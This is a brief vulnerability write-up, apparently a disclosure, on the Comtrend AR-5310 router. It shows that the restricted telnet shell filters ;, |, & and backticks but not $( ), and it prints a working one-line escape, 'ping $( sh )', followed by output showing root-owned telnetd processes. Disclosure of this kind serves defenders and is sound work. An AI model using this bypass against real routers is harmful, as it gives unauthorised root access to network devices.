**Disclaimer: All content here is to raise awareness and is not intended for malicious use.**

Vulnerable product: Comtrend AR-5310 , firmware version: GE31-412SSG-C01_R10.A2pG039u.d24k

TL;DR: A local user can bypass the restricted shell using the command substitution operator $( commmand )

Comtrend AR 5310 routers have a restricted shell, the list of commands a user can execute is

[ ? help logout exit quit reboot ads lxdslctl xtm loglevel logdest virtualserver ddns dumpcfg 
dumpmdm meminfo psp dumpsysinfo dnsproxy syslog ifconfig ping sntp sysinfo tftp wlan wlctl
vlanctl arp defaultgateway dhcpserver dns lan lanhosts passwd ppp restoredefault route
nslookup traceroute save uptime exitOnIdle wan build version serialnumber modelname acccntr
upnp urlfilter timeres tr69cfg logouttime ipneigh dhcp6sinfo nat mcpctl ]



Usual terminal constructs like:
 - the command separator ";" 
 - the control operator  "&"  (run in forground) 
 - the process communication operator (pipe) "|" 
 - the command substitution operator "`"
 
are all filtered as shown here :
```
 > ;
Warning: operator ; is not supported!
telnetd:error:476.449:processInput:490:unrecognized command 
 > |
Warning: operator | is not supported!
telnetd:error:484.871:processInput:490:unrecognized command 
 > &
Warning: operator & is not supported!
telnetd:error:487.421:processInput:490:unrecognized command 
 > `
Warning: operator ` is not supported!
telnetd:error:495.334:processInput:490:unrecognized command 
```

Still the $ operator is not filtered:
```
 > $
telnetd:error:497.862:processInput:490:unrecognized command $
```

Here I came to the conclusion that invoking a command with $( subcommand ) as argument would 
give an obvious shell
```
> ping $( sh )                                                              
exec >&2                                                                     
ps x | grep telnet                                                           
18333 root      4164 S    telnetd -m 0                                       
18334 root      4168 S    telnetd -m 0                                       
```

**EOF**

